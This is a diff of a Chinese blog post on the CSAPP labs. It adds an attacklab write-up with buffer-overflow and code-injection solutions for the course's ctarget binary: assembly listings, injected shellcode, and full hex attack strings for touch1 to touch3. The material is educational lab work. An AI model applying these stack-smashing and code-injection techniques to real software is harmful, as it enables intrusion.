@@ -18,14 +18,14 @@
   
     <meta name="description" content="在”拆弹“过程中结合 GDB 调试，分析理解掌握各种指令和数据结构的汇编代码表示">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CSAPP 第三章 bomblab">
+<meta property="og:title" content="CSAPP 第三章 bomblab attacklab">
 <meta property="og:url" content="https://shmodifier.github.io/2023/10/03/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/index.html">
 <meta property="og:site_name" content="Modifier">
 <meta property="og:description" content="在”拆弹“过程中结合 GDB 调试，分析理解掌握各种指令和数据结构的汇编代码表示">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://shmodifier.github.io/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
 <meta property="article:published_time" content="2023-10-03T07:46:35.000Z">
-<meta property="article:modified_time" content="2023-10-04T03:44:34.112Z">
+<meta property="article:modified_time" content="2023-11-22T06:48:22.474Z">
 <meta property="article:author" content="Modifier">
 <meta property="article:tag" content="Knowledge">
 <meta property="article:tag" content="CSAPPlab">
@@ -34,7 +34,7 @@
   
   
   
-  <title>CSAPP 第三章 bomblab - Modifier</title>
+  <title>CSAPP 第三章 bomblab attacklab - Modifier</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -212,7 +212,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CSAPP 第三章 bomblab"></span>
+            <span id="subtitle" data-typed-text="CSAPP 第三章 bomblab attacklab"></span>
           
         </div>
 
@@ -235,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.4k 字
+          13k 字
         
       </span>
     
@@ -246,7 +246,7 @@
         
         
         
-          79 分钟
+          106 分钟
         
       </span>
     
@@ -284,7 +284,7 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">CSAPP 第三章 bomblab</h1>
+            <h1 style="display: none">CSAPP 第三章 bomblab attacklab</h1>
             
             
               <div class="markdown-body">
@@ -292,7 +292,7 @@
                 <p>在”拆弹“过程中结合 GDB 调试，分析理解掌握各种指令和数据结构的汇编代码表示</p>
 <span id="more"></span>
 
-<p>实验给到一个可执行程序和一个C语言的源码，但是源码的函数没有给全，只能判断大致逻辑。</p>
+<h1 id="bomblab"><a href="#bomblab" class="headerlink" title="bomblab"></a>bomblab</h1><p>实验给到一个可执行程序和一个C语言的源码，但是源码的函数没有给全，只能判断大致逻辑。</p>
 <p>设置了六个关卡需要全部通过之后才算成功，只要有一个关卡失败就会退出</p>
 <hr>
 <p>先看了一眼.c文件的源码，文件中有大致如下几个函数 ：<code>initialize_bomb()</code> 、<code>read_line()</code> 、<code>explode bomb()</code>、 <code>phase_[number]()</code> 、<code>phase_defuse</code>。</p>
@@ -405,11 +405,88 @@
 
 <p>完结撒花~🥳</p>
 <p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-result.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="attaklab"><a href="#attaklab" class="headerlink" title="attaklab"></a>attaklab</h1><p>是书中的第三个实验，但是感觉实验内容和第三章的内容没什么关系</p>
+<p>一共是两个文件，一个是 <code>ctarget</code>，一个是 <code>rtarget</code></p>
+<p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-%E8%AF%95%E8%BF%90%E8%A1%8C.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中 ctarget 是存在代码注入攻击漏洞，rtarget是存在面向返回的编程（ROP）攻击漏洞。</p>
+<p><code>hex2raw</code> 是题目为我们提供的把十六进制表示转换为二进制数据的工具（超级简易版 pwntools !)，确定好要给<code>ctarget</code> 输入的信息，用 <code>hex2raw</code> 转换，通过 Linux 终端的 IO 重定向功能，就可以输入给进程。</p>
+<p>我只做了 ctarget。</p>
+<blockquote>
+<p>gdb 调不了这个文件不知道为啥，就 objdump -d ctarget &gt; ctarget.s 了汇编文件</p>
+</blockquote>
+<h3 id="touch1"><a href="#touch1" class="headerlink" title="touch1"></a>touch1</h3><blockquote>
+<p>任务描述：当函数 getbuf 返回后，让 ctarget 执行函数 touch1 ，而不是继续执行函数 test 。</p>
+</blockquote>
+<p>最开始就让输入一串字符串，目的是覆盖返回地址，使程序跳转到 <code>touch1</code></p>
+<p>真的很怪这个程序的开始部分不在 main 函数里，所在函数叫 <code>getbuf</code>，被很多层的嵌套在了 <code>launch</code> 函数里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004017a8 &lt;getbuf&gt;:<br>  4017a8:	48 83 ec 28          	sub    $0x28,%rsp<br>  4017ac:	48 89 e7             	mov    %rsp,%rdi<br>  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;<br>  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax<br>  4017b9:	48 83 c4 28          	add    $0x28,%rsp<br>  4017bd:	c3                   	retq   <br>  4017be:	90                   	nop<br>  4017bf:	90                   	nop<br></code></pre></td></tr></table></figure>
+
+<p>第一个<code>sub</code>指令把栈顶往下挪了40字节，也就是给缓冲区分配了40字节，然后调用了<code>Gets</code>，<code>Gets</code> 接收用户输入字符串。</p>
+<p>所以，我们需要填充 (0x28+8) 个字符，再填充 <code>touch1</code> 的地址 0x04017c0 覆盖返回地址。 <code>hex2raw</code>  接受十六进制的数据，再加上小端序处理信息，所以我们要喂给  <code>hex2raw</code>  的数据是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hex">11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40 <br></code></pre></td></tr></table></figure>
+
+<p>得出结果再丢给ctarget就行辣！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim touch1.txt<br>$ ./hex2raw &lt; touch1.txt &gt; touch1<br>$ ./ctarget -q -i ./touch1<br>Cookie: 0x59b997fa<br>Touch1!: You called touch1()<br>Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget<br>PASS: Would have posted the following:<br>	user <span class="hljs-built_in">id</span>	bovik<br>	course	15213-f15<br>	lab	attacklab<br>	result	1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40 <br></code></pre></td></tr></table></figure>
+
+<h3 id="touch2"><a href="#touch2" class="headerlink" title="touch2"></a>touch2</h3><blockquote>
+<p>任务描述：当函数 getbuf 返回后，让 ctarget 执行函数 touch2 ，而不是继续执行函数 test 。</p>
+</blockquote>
+<p>还是和 <code>touch1</code> 一样覆盖返回地址，但是这次还要传递一个参数，下面是 <code>touch2</code> 的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004017ec &lt;touch2&gt;:<br>  4017ec:	48 83 ec 08          	sub    $0x8,%rsp<br>  4017f0:	89 fa                	mov    %edi,%edx<br>  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;<br>  4017f9:	00 00 00 <br>  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;<br>  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;<br>  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi<br>  401809:	bf 01 00 00 00       	mov    $0x1,%edi<br>  40180e:	b8 00 00 00 00       	mov    $0x0,%eax<br>  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;<br>  401818:	bf 02 00 00 00       	mov    $0x2,%edi<br>  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;<br>  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;<br>  401824:	be 10 31 40 00       	mov    $0x403110,%esi<br>  401829:	bf 01 00 00 00       	mov    $0x1,%edi<br>  40182e:	b8 00 00 00 00       	mov    $0x0,%eax<br>  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;<br>  401838:	bf 02 00 00 00       	mov    $0x2,%edi<br>  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;<br>  401842:	bf 00 00 00 00       	mov    $0x0,%edi<br>  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我真的看汇编头晕我丢给 ida 了</p>
+</blockquote>
+<p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch2.png" srcset="/img/loading.gif" lazyload></p>
+<p>检查条件是 <code>val = cookie</code> ，cookie 每次都是一样的 <code>0x59b997fa</code>。我们要把这个值传给 val，可以用命令 <code>movq 0x59b997fa,%rdi</code> 实现。</p>
+<blockquote>
+<p>第一个参数用 rdi 传递</p>
+</blockquote>
+<p>如此，我们就可以在 getbuf 时填入该语句，再将返回地址改写成 touch2 的地址，这样一来再次跳转执行 <code>ret</code> ，就可以执行我们写入的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq 0x59b997fa,%rdi<br>pushq 0x04017ec<br>retq<br></code></pre></td></tr></table></figure>
+
+<p>最后获得的字节序列是 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hex">48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 00 00<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch2%E7%BB%93%E6%9E%9C.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="touch3"><a href="#touch3" class="headerlink" title="touch3"></a>touch3</h3><blockquote>
+<p>任务描述：当函数 getbuf 返回后，让 ctarget 执行函数 touch3 ，而不是继续执行函数 test 。</p>
+</blockquote>
+<p>同样还是从 test 跳转到 <code>touch3</code>，这次是调用了一个函数 <code>hexmatch()</code></p>
+<p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch3.png" srcset="/img/loading.gif" lazyload></p>
+<p> <code>hexmatch()</code> 必须为 true 才能成功</p>
+<p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-hexmatch.png" srcset="/img/loading.gif" lazyload></p>
+<p>就是要对比 sval 和 转化成字符串后的 cookie ，让它们俩相等。可以使用 <code>man ascii</code> 命令，得到字符串59b997fa 的十六进制表示：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">59b997fa</span> =&gt; <span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure>
+
+<p>在C语言中字符串需要在末尾补上结束符<code>&#39;\0&#39;</code>，其对应的十六进制形式为<code>0x00</code>。因此，字符串的完整表示为：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+
+<p>由于此处 v2 为指针指向某处地址，我们要将 rdi 地址设置为字符串的地址。此时我们需要考虑把字符串存储在哪里，由于函数 hexmatch 和 strncmp 被调用时，getbuf 使用的缓冲区会被重写。因此，不能将字符串存放在getbuf 的缓冲区中。可以把其存放在 test 的栈帧中。</p>
+<p>getbuf的栈顶地址为<code>0x5561dc78</code>，getbuf 的缓冲区在栈中占了40个字节，随后其返回地址又占了8个字节，共计48&#x3D;0x30个字节。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x5561dc78</span> + <span class="hljs-number">0</span>x30 = <span class="hljs-number">0</span>x5561dca8<br></code></pre></td></tr></table></figure>
+
+<p>因此，可以将 cookie 值存放在地址 <code>0x5561dca8</code> 中。</p>
+<p>注入的汇编代码就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov $0x5561dca8, %rdi<br>push $0x4018fa        <br>ret                  <br></code></pre></td></tr></table></figure>
+
+<p>最终的攻击字符串为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hex">48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch3%E7%BB%93%E6%9E%9C.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
 <p>原来这个实验我做了三天😶‍🌫️果然假期就是懒惰</p>
 <p>xsbb:</p>
 <p>在 phase_3 的跳转表那里，其实我当时根本没看出来这是跳转表，我去问了 chatCPT😿</p>
 <p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct_chat.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<p>编辑记录：</p>
+<ul>
+<li><p>2023-10-03 bomblab</p>
+</li>
+<li><p>2023-11-20 attacklab</p>
+</li>
+</ul>
 
                 
               </div>
@@ -457,7 +534,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CSAPP 第三章 bomblab</div>
+      <div>CSAPP 第三章 bomblab attacklab</div>
       <div>https://shmodifier.github.io/2023/10/03/CSAPP-第三章-bomblab/</div>
     </div>
     <div class="license-meta">
